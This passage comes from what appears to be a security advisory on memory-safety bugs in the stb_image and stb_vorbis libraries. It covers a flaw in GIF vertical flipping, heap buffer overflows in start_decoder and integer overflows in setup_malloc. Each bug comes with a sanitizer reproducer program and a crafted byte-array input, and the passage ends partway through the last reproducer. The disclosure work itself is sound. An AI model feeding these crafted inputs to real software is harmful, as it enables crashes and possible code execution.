   <span class="n">stbi__start_mem</span><span class="p">(</span><span class="o">&amp;</span><span class="n">s</span><span class="p">,</span><span class="n">buffer</span><span class="p">,</span><span class="n">len</span><span class="p">);</span>

   <span class="n">result</span> <span class="o">=</span> <span class="p">(</span><span class="kt">unsigned</span> <span class="kt">char</span><span class="o">*</span><span class="p">)</span> <span class="n">stbi__load_gif_main</span><span class="p">(</span><span class="o">&amp;</span><span class="n">s</span><span class="p">,</span> <span class="n">delays</span><span class="p">,</span> <span class="n">x</span><span class="p">,</span> <span class="n">y</span><span class="p">,</span> <span class="n">z</span><span class="p">,</span> <span class="n">comp</span><span class="p">,</span> <span class="n">req_comp</span><span class="p">);</span> <span class="c1">// [1]</span>
   <span class="k">if</span> <span class="p">(</span><span class="n">stbi__vertically_flip_on_load</span><span class="p">)</span> <span class="p">{</span> <span class="c1">// [2]</span>
      <span class="n">stbi__vertical_flip_slices</span><span class="p">(</span> <span class="n">result</span><span class="p">,</span> <span class="o">*</span><span class="n">x</span><span class="p">,</span> <span class="o">*</span><span class="n">y</span><span class="p">,</span> <span class="o">*</span><span class="n">z</span><span class="p">,</span> <span class="o">*</span><span class="n">comp</span> <span class="p">);</span> <span class="c1">// [3]</span>
   <span class="p">}</span>

   <span class="k">return</span> <span class="n">result</span><span class="p">;</span>
<span class="p">}</span>
</code></pre></div></div>

<p>It depends on the value of <code class="language-plaintext highlighter-rouge">z</code> [4] if the program enters the loop and attempts to dereference the null pointer value in <code class="language-plaintext highlighter-rouge">stbi__vertical_flip</code> [5].</p>

<div class="language-cpp highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">static</span> <span class="kt">void</span> <span class="nf">stbi__vertical_flip_slices</span><span class="p">(</span><span class="kt">void</span> <span class="o">*</span><span class="n">image</span><span class="p">,</span> <span class="kt">int</span> <span class="n">w</span><span class="p">,</span> <span class="kt">int</span> <span class="n">h</span><span class="p">,</span> <span class="kt">int</span> <span class="n">z</span><span class="p">,</span> <span class="kt">int</span> <span class="n">bytes_per_pixel</span><span class="p">)</span>
<span class="p">{</span>
   <span class="kt">int</span> <span class="n">slice</span><span class="p">;</span>
   <span class="kt">int</span> <span class="n">slice_size</span> <span class="o">=</span> <span class="n">w</span> <span class="o">*</span> <span class="n">h</span> <span class="o">*</span> <span class="n">bytes_per_pixel</span><span class="p">;</span>

   <span class="n">stbi_uc</span> <span class="o">*</span><span class="n">bytes</span> <span class="o">=</span> <span class="p">(</span><span class="n">stbi_uc</span> <span class="o">*</span><span class="p">)</span><span class="n">image</span><span class="p">;</span>
   <span class="k">for</span> <span class="p">(</span><span class="n">slice</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">slice</span> <span class="o">&lt;</span> <span class="n">z</span><span class="p">;</span> <span class="o">++</span><span class="n">slice</span><span class="p">)</span> <span class="p">{</span> <span class="c1">// [4]</span>
      <span class="n">stbi__vertical_flip</span><span class="p">(</span><span class="n">bytes</span><span class="p">,</span> <span class="n">w</span><span class="p">,</span> <span class="n">h</span><span class="p">,</span> <span class="n">bytes_per_pixel</span><span class="p">);</span> <span class="c1">// [5]</span>
      <span class="n">bytes</span> <span class="o">+=</span> <span class="n">slice_size</span><span class="p">;</span>
   <span class="p">}</span>
<span class="p">}</span>
</code></pre></div></div>

<h4 id="impact-6">Impact</h4>

<p>This issue may lead to denial of service.</p>

<h4 id="resources-6">Resources</h4>

<p>To reproduce the issue in <code class="language-plaintext highlighter-rouge">stbi__vertical_flip_slices</code>:</p>

<ol>
  <li>Make MSAN build of the following program:</li>
</ol>

<div class="language-cpp highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">#include</span> <span class="cpf">&lt;stdint.h&gt;</span><span class="cp">
#define STB_IMAGE_IMPLEMENTATION
#include</span> <span class="cpf">"../stb_image.h"</span><span class="cp">
</span>
<span class="kt">int</span> <span class="nf">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="kt">char</span><span class="o">*</span> <span class="n">argv</span><span class="p">[])</span>
<span class="p">{</span>
    <span class="k">const</span> <span class="kt">uint8_t</span> <span class="n">data</span><span class="p">[]</span> <span class="o">=</span> <span class="p">{</span><span class="mh">0x47</span><span class="p">,</span><span class="mh">0x49</span><span class="p">,</span><span class="mh">0x38</span><span class="p">,</span><span class="mh">0x00</span><span class="p">,</span><span class="mh">0x00</span><span class="p">,</span><span class="mh">0x00</span><span class="p">,</span><span class="mh">0x00</span><span class="p">,</span><span class="mh">0x00</span><span class="p">,</span><span class="mh">0x00</span><span class="p">,</span><span class="mh">0x00</span><span class="p">,</span><span class="mh">0x00</span><span class="p">,</span><span class="mh">0x35</span><span class="p">,</span><span class="mh">0xff</span><span class="p">};</span>
    <span class="kt">size_t</span> <span class="n">size</span> <span class="o">=</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">data</span><span class="p">);</span>

    <span class="n">stbi_set_flip_vertically_on_load</span><span class="p">(</span><span class="mi">1</span><span class="p">);</span>
    <span class="kt">int</span> <span class="n">x</span><span class="p">,</span> <span class="n">y</span><span class="p">,</span> <span class="n">z</span><span class="p">,</span> <span class="n">channels</span><span class="p">;</span>
    <span class="n">stbi_uc</span> <span class="o">*</span><span class="n">img</span> <span class="o">=</span> <span class="n">stbi_load_gif_from_memory</span><span class="p">(</span><span class="n">data</span><span class="p">,</span> <span class="n">size</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">x</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">y</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">z</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">channels</span><span class="p">,</span> <span class="mi">4</span><span class="p">);</span>
    <span class="n">stbi_image_free</span><span class="p">(</span><span class="n">img</span><span class="p">);</span>
    <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
<span class="p">}</span>
</code></pre></div></div>

<ol>
  <li>Set breakpoint at line 1251 in <a href="https://github.com/nothings/stb/blob/5736b15f7ea0ffb08dd38af21067c314d6a3aae9/stb_image.h#L1251"><code class="language-plaintext highlighter-rouge">stbi__vertical_flip_slices</code></a> and run the program to hit the usage of the uninitialized memory.</li>
</ol>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>==292219==WARNING: MemorySanitizer: use-of-uninitialized-value
    #0 0x4b0ad6 in stbi__vertical_flip_slices(void*, int, int, int, int) tests/../stb_image.h:1251:4
    #1 0x4ad19e in stbi_load_gif_from_memory tests/../stb_image.h:1450:7
</code></pre></div></div>

<h3 id="issue-8-0-byte-write-heap-buffer-overflow-in-start_decoder-ghsl-2023-165">Issue 8: <code class="language-plaintext highlighter-rouge">0</code> byte write heap buffer overflow in <code class="language-plaintext highlighter-rouge">start_decoder</code> (<code class="language-plaintext highlighter-rouge">GHSL-2023-165</code>)</h3>

<p>A crafted file may trigger out of bounds write in <a href="https://github.com/nothings/stb/blob/5736b15f7ea0ffb08dd38af21067c314d6a3aae9/stb_vorbis.c#L3658"><code class="language-plaintext highlighter-rouge">f-&gt;vendor[len] = (char)'\0';</code></a> [1]. The root cause is that if <a href="https://github.com/nothings/stb/blob/5736b15f7ea0ffb08dd38af21067c314d6a3aae9/stb_vorbis.c#L3652-L3658"><code class="language-plaintext highlighter-rouge">len</code> read in <code class="language-plaintext highlighter-rouge">start_decoder</code></a> [2] is <code class="language-plaintext highlighter-rouge">-1</code> and <code class="language-plaintext highlighter-rouge">len + 1</code> becomes <code class="language-plaintext highlighter-rouge">0</code> when passed to <code class="language-plaintext highlighter-rouge">setup_malloc</code> in [3].</p>

<div class="language-cpp highlighter-rouge"><div class="highlight"><pre class="highlight"><code>   <span class="n">len</span> <span class="o">=</span> <span class="n">get32_packet</span><span class="p">(</span><span class="n">f</span><span class="p">);</span> <span class="c1">// [2]</span>
   <span class="n">f</span><span class="o">-&gt;</span><span class="n">vendor</span> <span class="o">=</span> <span class="p">(</span><span class="kt">char</span><span class="o">*</span><span class="p">)</span><span class="n">setup_malloc</span><span class="p">(</span><span class="n">f</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="kt">char</span><span class="p">)</span> <span class="o">*</span> <span class="p">(</span><span class="n">len</span><span class="o">+</span><span class="mi">1</span><span class="p">));</span> <span class="c1">// [3]</span>
   <span class="k">if</span> <span class="p">(</span><span class="n">f</span><span class="o">-&gt;</span><span class="n">vendor</span> <span class="o">==</span> <span class="nb">NULL</span><span class="p">)</span>                           <span class="k">return</span> <span class="nf">error</span><span class="p">(</span><span class="n">f</span><span class="p">,</span> <span class="n">VORBIS_outofmem</span><span class="p">);</span>
   <span class="k">for</span><span class="p">(</span><span class="n">i</span><span class="o">=</span><span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="n">len</span><span class="p">;</span> <span class="o">++</span><span class="n">i</span><span class="p">)</span> <span class="p">{</span>
      <span class="n">f</span><span class="o">-&gt;</span><span class="n">vendor</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">=</span> <span class="n">get8_packet</span><span class="p">(</span><span class="n">f</span><span class="p">);</span>
   <span class="p">}</span>
   <span class="n">f</span><span class="o">-&gt;</span><span class="n">vendor</span><span class="p">[</span><span class="n">len</span><span class="p">]</span> <span class="o">=</span> <span class="p">(</span><span class="kt">char</span><span class="p">)</span><span class="sc">'\0'</span><span class="p">;</span> <span class="c1">// [1]</span>
</code></pre></div></div>

<p>The <a href="https://github.com/nothings/stb/blob/5736b15f7ea0ffb08dd38af21067c314d6a3aae9/stb_vorbis.c#L950-L960"><code class="language-plaintext highlighter-rouge">setup_malloc</code></a> behaves differently when <code class="language-plaintext highlighter-rouge">f-&gt;alloc.alloc_buffer</code> is pre-allocated. Instead of returning <code class="language-plaintext highlighter-rouge">NULL</code> as in <code class="language-plaintext highlighter-rouge">malloc</code> case [4] it shifts the pre-allocated buffer by zero and returns the currently available memory block.</p>

<div class="language-cpp highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">static</span> <span class="kt">void</span> <span class="o">*</span><span class="nf">setup_malloc</span><span class="p">(</span><span class="n">vorb</span> <span class="o">*</span><span class="n">f</span><span class="p">,</span> <span class="kt">int</span> <span class="n">sz</span><span class="p">)</span>
<span class="p">{</span>
   <span class="n">sz</span> <span class="o">=</span> <span class="p">(</span><span class="n">sz</span><span class="o">+</span><span class="mi">7</span><span class="p">)</span> <span class="o">&amp;</span> <span class="o">~</span><span class="mi">7</span><span class="p">;</span> <span class="c1">// round up to nearest 8 for alignment of future allocs.</span>
   <span class="n">f</span><span class="o">-&gt;</span><span class="n">setup_memory_required</span> <span class="o">+=</span> <span class="n">sz</span><span class="p">;</span>
   <span class="k">if</span> <span class="p">(</span><span class="n">f</span><span class="o">-&gt;</span><span class="n">alloc</span><span class="p">.</span><span class="n">alloc_buffer</span><span class="p">)</span> <span class="p">{</span>
      <span class="kt">void</span> <span class="o">*</span><span class="n">p</span> <span class="o">=</span> <span class="p">(</span><span class="kt">char</span> <span class="o">*</span><span class="p">)</span> <span class="n">f</span><span class="o">-&gt;</span><span class="n">alloc</span><span class="p">.</span><span class="n">alloc_buffer</span> <span class="o">+</span> <span class="n">f</span><span class="o">-&gt;</span><span class="n">setup_offset</span><span class="p">;</span> <span class="c1">// [5]</span>
      <span class="k">if</span> <span class="p">(</span><span class="n">f</span><span class="o">-&gt;</span><span class="n">setup_offset</span> <span class="o">+</span> <span class="n">sz</span> <span class="o">&gt;</span> <span class="n">f</span><span class="o">-&gt;</span><span class="n">temp_offset</span><span class="p">)</span> <span class="k">return</span> <span class="nb">NULL</span><span class="p">;</span>
      <span class="n">f</span><span class="o">-&gt;</span><span class="n">setup_offset</span> <span class="o">+=</span> <span class="n">sz</span><span class="p">;</span>
      <span class="k">return</span> <span class="n">p</span><span class="p">;</span>
   <span class="p">}</span>
   <span class="k">return</span> <span class="n">sz</span> <span class="o">?</span> <span class="n">malloc</span><span class="p">(</span><span class="n">sz</span><span class="p">)</span> <span class="o">:</span> <span class="nb">NULL</span><span class="p">;</span> <span class="c1">// [4]</span>
<span class="p">}</span>
</code></pre></div></div>

<h4 id="impact-7">Impact</h4>

<p>This issue may lead to code execution.</p>

<h4 id="resources-7">Resources</h4>

<p>To reproduce the issue:</p>

<ol>
  <li>Make ASAN build of the following program:</li>
</ol>

<div class="language-cpp highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">#include</span> <span class="cpf">"../stb_vorbis.c"</span><span class="cp">
#include</span> <span class="cpf">&lt;stdint.h&gt;</span><span class="cp">
</span>
<span class="kt">int</span> <span class="nf">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="kt">char</span><span class="o">*</span> <span class="n">argv</span><span class="p">[])</span>
<span class="p">{</span>
    <span class="k">const</span> <span class="kt">uint8_t</span> <span class="n">data</span><span class="p">[]</span> <span class="o">=</span> <span class="p">{</span><span class="mh">0x4f</span><span class="p">,</span><span class="mh">0x67</span><span class="p">,</span><span class="mh">0x67</span><span class="p">,</span><span class="mh">0x53</span><span class="p">,</span><span class="mh">0x00</span><span class="p">,</span><span class="mh">0x02</span><span class="p">,</span><span class="mh">0xac</span><span class="p">,</span><span class="mh">0xf4</span><span class="p">,</span><span class="mh">0x30</span><span class="p">,</span>
                            <span class="mh">0x19</span><span class="p">,</span><span class="mh">0x50</span><span class="p">,</span><span class="mh">0x13</span><span class="p">,</span><span class="mh">0x00</span><span class="p">,</span><span class="mh">0x68</span><span class="p">,</span><span class="mh">0x00</span><span class="p">,</span><span class="mh">0x00</span><span class="p">,</span><span class="mh">0x00</span><span class="p">,</span><span class="mh">0x21</span><span class="p">,</span>
                            <span class="mh">0x00</span><span class="p">,</span><span class="mh">0x40</span><span class="p">,</span><span class="mh">0x00</span><span class="p">,</span><span class="mh">0x00</span><span class="p">,</span><span class="mh">0x00</span><span class="p">,</span><span class="mh">0x7e</span><span class="p">,</span><span class="mh">0x84</span><span class="p">,</span><span class="mh">0x04</span><span class="p">,</span><span class="mh">0x01</span><span class="p">,</span>
                            <span class="mh">0x1e</span><span class="p">,</span><span class="mh">0x01</span><span class="p">,</span><span class="mh">0x76</span><span class="p">,</span><span class="mh">0x6f</span><span class="p">,</span><span class="mh">0x72</span><span class="p">,</span><span class="mh">0x62</span><span class="p">,</span><span class="mh">0x69</span><span class="p">,</span><span class="mh">0x73</span><span class="p">,</span><span class="mh">0x00</span><span class="p">,</span>
                            <span class="mh">0x00</span><span class="p">,</span><span class="mh">0x00</span><span class="p">,</span><span class="mh">0x00</span><span class="p">,</span><span class="mh">0x05</span><span class="p">,</span><span class="mh">0x00</span><span class="p">,</span><span class="mh">0x45</span><span class="p">,</span><span class="mh">0xc5</span><span class="p">,</span><span class="mh">0x87</span><span class="p">,</span><span class="mh">0x03</span><span class="p">,</span>
                            <span class="mh">0x00</span><span class="p">,</span><span class="mh">0x04</span><span class="p">,</span><span class="mh">0x00</span><span class="p">,</span><span class="mh">0x02</span><span class="p">,</span><span class="mh">0x00</span><span class="p">,</span><span class="mh">0x08</span><span class="p">,</span><span class="mh">0x00</span><span class="p">,</span><span class="mh">0x00</span><span class="p">,</span><span class="mh">0x01</span><span class="p">,</span>
                            <span class="mh">0x00</span><span class="p">,</span><span class="mh">0x2e</span><span class="p">,</span><span class="mh">0xa9</span><span class="p">,</span><span class="mh">0xcb</span><span class="p">,</span><span class="mh">0x4f</span><span class="p">,</span><span class="mh">0x67</span><span class="p">,</span><span class="mh">0x67</span><span class="p">,</span><span class="mh">0x53</span><span class="p">,</span><span class="mh">0x00</span><span class="p">,</span>
                            <span class="mh">0x28</span><span class="p">,</span><span class="mh">0x00</span><span class="p">,</span><span class="mh">0x00</span><span class="p">,</span><span class="mh">0xf7</span><span class="p">,</span><span class="mh">0xff</span><span class="p">,</span><span class="mh">0xff</span><span class="p">,</span><span class="mh">0x7f</span><span class="p">,</span><span class="mh">0x68</span><span class="p">,</span><span class="mh">0x00</span><span class="p">,</span>
                            <span class="mh">0xff</span><span class="p">,</span><span class="mh">0xff</span><span class="p">,</span><span class="mh">0xff</span><span class="p">,</span><span class="mh">0xff</span><span class="p">,</span><span class="mh">0xff</span><span class="p">,</span><span class="mh">0xff</span><span class="p">,</span><span class="mh">0xff</span><span class="p">,</span><span class="mh">0x76</span><span class="p">,</span><span class="mh">0x6f</span><span class="p">,</span>
                            <span class="mh">0x72</span><span class="p">,</span><span class="mh">0x73</span><span class="p">,</span><span class="mh">0x00</span><span class="p">,</span><span class="mh">0x00</span><span class="p">,</span><span class="mh">0x03</span><span class="p">,</span><span class="mh">0x76</span><span class="p">,</span><span class="mh">0x6f</span><span class="p">,</span><span class="mh">0x72</span><span class="p">,</span><span class="mh">0x62</span><span class="p">,</span>
                            <span class="mh">0x69</span><span class="p">,</span><span class="mh">0x73</span><span class="p">,</span><span class="mh">0xff</span><span class="p">,</span><span class="mh">0xff</span><span class="p">,</span><span class="mh">0xff</span><span class="p">,</span><span class="mh">0xff</span><span class="p">};</span>
    <span class="kt">size_t</span> <span class="n">size</span> <span class="o">=</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">data</span><span class="p">);</span>

    <span class="n">stb_vorbis_alloc</span> <span class="n">alloc</span><span class="p">;</span>
    <span class="kt">int</span> <span class="n">alloc_buffer_length</span> <span class="o">=</span> <span class="mi">600</span> <span class="o">*</span> <span class="mi">1024</span><span class="p">;</span>
    <span class="n">alloc</span><span class="p">.</span><span class="n">alloc_buffer</span> <span class="o">=</span> <span class="p">(</span><span class="kt">char</span><span class="o">*</span><span class="p">)</span><span class="n">malloc</span><span class="p">(</span><span class="n">alloc_buffer_length</span><span class="p">);</span>
    <span class="n">alloc</span><span class="p">.</span><span class="n">alloc_buffer_length_in_bytes</span> <span class="o">=</span> <span class="n">alloc_buffer_length</span><span class="p">;</span>
    <span class="kt">int</span> <span class="n">err</span><span class="p">;</span>
    <span class="n">stb_vorbis</span><span class="o">*</span> <span class="n">out</span> <span class="o">=</span> <span class="n">stb_vorbis_open_memory</span><span class="p">(</span><span class="n">data</span><span class="p">,</span> <span class="n">size</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">err</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">alloc</span><span class="p">);</span>
    <span class="n">stb_vorbis_close</span><span class="p">(</span><span class="n">out</span><span class="p">);</span>
    <span class="n">free</span><span class="p">(</span><span class="n">alloc</span><span class="p">.</span><span class="n">alloc_buffer</span><span class="p">);</span>
    <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
<span class="p">}</span>
</code></pre></div></div>

<ol>
  <li>Run the program to hit the error.</li>
</ol>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>==93713==ERROR: AddressSanitizer: heap-buffer-overflow on address 0x7f37941697ff at pc 0x0000004e41ed bp 0x7ffe67641670 sp 0x7ffe67641668
WRITE of size 1 at 0x7f37941697ff thread T0
    #0 0x4e41ec in start_decoder(stb_vorbis*) tests/../stb_vorbis.c:3658:19
    #1 0x4f9444 in stb_vorbis_open_memory tests/../stb_vorbis.c:5112:8
</code></pre></div></div>

<h3 id="issue-9-multi-byte-write-heap-buffer-overflow-in-start_decoder-ghsl-2023-166">Issue 9: Multi-byte write heap buffer overflow in <code class="language-plaintext highlighter-rouge">start_decoder</code> (<code class="language-plaintext highlighter-rouge">GHSL-2023-166</code>)</h3>

<p>A crafted file may trigger out of bounds write in <a href="https://github.com/nothings/stb/blob/5736b15f7ea0ffb08dd38af21067c314d6a3aae9/stb_vorbis.c#L3656"><code class="language-plaintext highlighter-rouge">f-&gt;vendor[i] = get8_packet(f);</code></a>. The root cause is an integer overflow in <a href="https://github.com/nothings/stb/blob/5736b15f7ea0ffb08dd38af21067c314d6a3aae9/stb_vorbis.c#L950-L960"><code class="language-plaintext highlighter-rouge">setup_malloc</code></a>. A sufficiently large <code class="language-plaintext highlighter-rouge">sz</code> overflows <code class="language-plaintext highlighter-rouge">sz+7</code> in [1] and the negative value passes the maximum available memory buffer check in [2].</p>

<div class="language-cpp highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">static</span> <span class="kt">void</span> <span class="o">*</span><span class="nf">setup_malloc</span><span class="p">(</span><span class="n">vorb</span> <span class="o">*</span><span class="n">f</span><span class="p">,</span> <span class="kt">int</span> <span class="n">sz</span><span class="p">)</span>
<span class="p">{</span>
   <span class="n">sz</span> <span class="o">=</span> <span class="p">(</span><span class="n">sz</span><span class="o">+</span><span class="mi">7</span><span class="p">)</span> <span class="o">&amp;</span> <span class="o">~</span><span class="mi">7</span><span class="p">;</span> <span class="c1">// round up to nearest 8 for alignment of future allocs. // [1] Int overflow</span>
   <span class="n">f</span><span class="o">-&gt;</span><span class="n">setup_memory_required</span> <span class="o">+=</span> <span class="n">sz</span><span class="p">;</span>
   <span class="k">if</span> <span class="p">(</span><span class="n">f</span><span class="o">-&gt;</span><span class="n">alloc</span><span class="p">.</span><span class="n">alloc_buffer</span><span class="p">)</span> <span class="p">{</span>
      <span class="kt">void</span> <span class="o">*</span><span class="n">p</span> <span class="o">=</span> <span class="p">(</span><span class="kt">char</span> <span class="o">*</span><span class="p">)</span> <span class="n">f</span><span class="o">-&gt;</span><span class="n">alloc</span><span class="p">.</span><span class="n">alloc_buffer</span> <span class="o">+</span> <span class="n">f</span><span class="o">-&gt;</span><span class="n">setup_offset</span><span class="p">;</span>
      <span class="k">if</span> <span class="p">(</span><span class="n">f</span><span class="o">-&gt;</span><span class="n">setup_offset</span> <span class="o">+</span> <span class="n">sz</span> <span class="o">&gt;</span> <span class="n">f</span><span class="o">-&gt;</span><span class="n">temp_offset</span><span class="p">)</span> <span class="k">return</span> <span class="nb">NULL</span><span class="p">;</span> <span class="c1">// [2] Negative int passes the check</span>
      <span class="n">f</span><span class="o">-&gt;</span><span class="n">setup_offset</span> <span class="o">+=</span> <span class="n">sz</span><span class="p">;</span>
      <span class="k">return</span> <span class="n">p</span><span class="p">;</span>
   <span class="p">}</span>
   <span class="k">return</span> <span class="n">sz</span> <span class="o">?</span> <span class="n">malloc</span><span class="p">(</span><span class="n">sz</span><span class="p">)</span> <span class="o">:</span> <span class="nb">NULL</span><span class="p">;</span>
<span class="p">}</span>
</code></pre></div></div>

<p>Similar overflow exists in <a href="https://github.com/nothings/stb/blob/5736b15f7ea0ffb08dd38af21067c314d6a3aae9/stb_vorbis.c#L969-L978"><code class="language-plaintext highlighter-rouge">setup_temp_malloc</code></a> at [3]</p>

<div class="language-cpp highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">static</span> <span class="kt">void</span> <span class="o">*</span><span class="nf">setup_temp_malloc</span><span class="p">(</span><span class="n">vorb</span> <span class="o">*</span><span class="n">f</span><span class="p">,</span> <span class="kt">int</span> <span class="n">sz</span><span class="p">)</span>
<span class="p">{</span>
   <span class="n">sz</span> <span class="o">=</span> <span class="p">(</span><span class="n">sz</span><span class="o">+</span><span class="mi">7</span><span class="p">)</span> <span class="o">&amp;</span> <span class="o">~</span><span class="mi">7</span><span class="p">;</span> <span class="c1">// round up to nearest 8 for alignment of future allocs. // [3]</span>
   <span class="k">if</span> <span class="p">(</span><span class="n">f</span><span class="o">-&gt;</span><span class="n">alloc</span><span class="p">.</span><span class="n">alloc_buffer</span><span class="p">)</span> <span class="p">{</span>
      <span class="k">if</span> <span class="p">(</span><span class="n">f</span><span class="o">-&gt;</span><span class="n">temp_offset</span> <span class="o">-</span> <span class="n">sz</span> <span class="o">&lt;</span> <span class="n">f</span><span class="o">-&gt;</span><span class="n">setup_offset</span><span class="p">)</span> <span class="k">return</span> <span class="nb">NULL</span><span class="p">;</span>
      <span class="n">f</span><span class="o">-&gt;</span><span class="n">temp_offset</span> <span class="o">-=</span> <span class="n">sz</span><span class="p">;</span>
      <span class="k">return</span> <span class="p">(</span><span class="kt">char</span> <span class="o">*</span><span class="p">)</span> <span class="n">f</span><span class="o">-&gt;</span><span class="n">alloc</span><span class="p">.</span><span class="n">alloc_buffer</span> <span class="o">+</span> <span class="n">f</span><span class="o">-&gt;</span><span class="n">temp_offset</span><span class="p">;</span>
   <span class="p">}</span>
   <span class="k">return</span> <span class="nf">malloc</span><span class="p">(</span><span class="n">sz</span><span class="p">);</span>
<span class="p">}</span>
</code></pre></div></div>

<h4 id="impact-8">Impact</h4>

<p>This issue may lead to code execution.</p>

<h4 id="resources-8">Resources</h4>

<p>To reproduce the issue:</p>

<ol>
  <li>Make ASAN build of the following program:</li>
</ol>

<div class="language-cpp highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">#include</span> <span class="cpf">"../stb_vorbis.c"</span><span class="cp">
#include</span> <span class="cpf">&lt;stdint.h&gt;</span><span class="cp">
</span>
<span class="kt">int</span> <span class="nf">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="kt">char</span><span class="o">*</span> <span class="n">argv</span><span class="p">[])</span>
<span class="p">{</span>
    <span class="k">const</span> <span class="kt">uint8_t</span> <span class="n">data</span><span class="p">[]</span> <span class="o">=</span> <span class="p">{</span><span class="mh">0x4f</span><span class="p">,</span><span class="mh">0x67</span><span class="p">,</span><span class="mh">0x67</span><span class="p">,</span><span class="mh">0x53</span><span class="p">,</span><span class="mh">0x00</span><span class="p">,</span><span class="mh">0x02</span><span class="p">,</span><span class="mh">0xff</span><span class="p">,</span><span class="mh">0xb8</span><span class="p">,</span><span class="mh">0x03</span><span class="p">,</span>
                            <span class="mh">0x00</span><span class="p">,</span><span class="mh">0xff</span><span class="p">,</span><span class="mh">0x20</span><span class="p">,</span><span class="mh">0xff</span><span class="p">,</span><span class="mh">0x00</span><span class="p">,</span><span class="mh">0x21</span><span class="p">,</span><span class="mh">0x68</span><span class="p">,</span><span class="mh">0x00</span><span class="p">,</span><span class="mh">0x00</span><span class="p">,</span>
                            <span class="mh">0x00</span><span class="p">,</span><span class="mh">0x00</span><span class="p">,</span><span class="mh">0x00</span><span class="p">,</span><span class="mh">0x00</span><span class="p">,</span><span class="mh">0xa0</span><span class="p">,</span><span class="mh">0x6a</span><span class="p">,</span><span class="mh">0xab</span><span class="p">,</span><span class="mh">0x75</span><span class="p">,</span><span class="mh">0x01</span><span class="p">,</span>
                            <span class="mh">0x1e</span><span class="p">,</span><span class="mh">0x01</span><span class="p">,</span><span class="mh">0x76</span><span class="p">,</span><span class="mh">0x6f</span><span class="p">,</span><span class="mh">0x72</span><span class="p">,</span><span class="mh">0x62</span><span class="p">,</span><span class="mh">0x69</span><span class="p">,</span><span class="mh">0x73</span><span class="p">,</span><span class="mh">0x00</span><span class="p">,</span>
                            <span class="mh">0x00</span><span class="p">,</span><span class="mh">0x00</span><span class="p">,</span><span class="mh">0x00</span><span class="p">,</span><span class="mh">0x01</span><span class="p">,</span><span class="mh">0x31</span><span class="p">,</span><span class="mh">0xef</span><span class="p">,</span><span class="mh">0xf9</span><span class="p">,</span><span class="mh">0xfe</span><span class="p">,</span><span class="mh">0x00</span><span class="p">,</span>
                            <span class="mh">0x00</span><span class="p">,</span><span class="mh">0x09</span><span class="p">,</span><span class="mh">0x00</span><span class="p">,</span><span class="mh">0x00</span><span class="p">,</span><span class="mh">0x71</span><span class="p">,</span><span class="mh">0x02</span><span class="p">,</span><span class="mh">0x10</span><span class="p">,</span><span class="mh">0x00</span><span class="p">,</span><span class="mh">0x08</span><span class="p">,</span>
                            <span class="mh">0x00</span><span class="p">,</span><span class="mh">0x9f</span><span class="p">,</span><span class="mh">0xb8</span><span class="p">,</span><span class="mh">0x01</span><span class="p">,</span><span class="mh">0x4f</span><span class="p">,</span><span class="mh">0x67</span><span class="p">,</span><span class="mh">0x67</span><span class="p">,</span><span class="mh">0x53</span><span class="p">,</span><span class="mh">0x00</span><span class="p">,</span>
                            <span class="mh">0x00</span><span class="p">,</span><span class="mh">0x1c</span><span class="p">,</span><span class="mh">0x00</span><span class="p">,</span><span class="mh">0x80</span><span class="p">,</span><span class="mh">0xff</span><span class="p">,</span><span class="mh">0x01</span><span class="p">,</span><span class="mh">0x40</span><span class="p">,</span><span class="mh">0x21</span><span class="p">,</span><span class="mh">0x68</span><span class="p">,</span>
                            <span class="mh">0x00</span><span class="p">,</span><span class="mh">0x00</span><span class="p">,</span><span class="mh">0x01</span><span class="p">,</span><span class="mh">0x00</span><span class="p">,</span><span class="mh">0x00</span><span class="p">,</span><span class="mh">0x00</span><span class="p">,</span><span class="mh">0xfe</span><span class="p">,</span><span class="mh">0xff</span><span class="p">,</span><span class="mh">0xff</span><span class="p">,</span>
                            <span class="mh">0x7f</span><span class="p">,</span><span class="mh">0x00</span><span class="p">,</span><span class="mh">0x00</span><span class="p">,</span><span class="mh">0x00</span><span class="p">,</span><span class="mh">0x03</span><span class="p">,</span><span class="mh">0x76</span><span class="p">,</span><span class="mh">0x6f</span><span class="p">,</span><span class="mh">0x72</span><span class="p">,</span><span class="mh">0x62</span><span class="p">,</span>
                            <span class="mh">0x69</span><span class="p">,</span><span class="mh">0x73</span><span class="p">,</span><span class="mh">0xfe</span><span class="p">,</span><span class="mh">0xff</span><span class="p">,</span><span class="mh">0xff</span><span class="p">,</span><span class="mh">0x7f</span><span class="p">};</span>
    <span class="kt">size_t</span> <span class="n">size</span> <span class="o">=</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">data</span><span class="p">);</span>

    <span class="n">stb_vorbis_alloc</span> <span class="n">alloc</span><span class="p">;</span>
    <span class="kt">int</span> <span class="n">alloc_buffer_length</span> <span class="o">=</span> <span class="mi">600</span> <span class="o">*</span> <span class="mi">1024</span><span class="p">;</span>
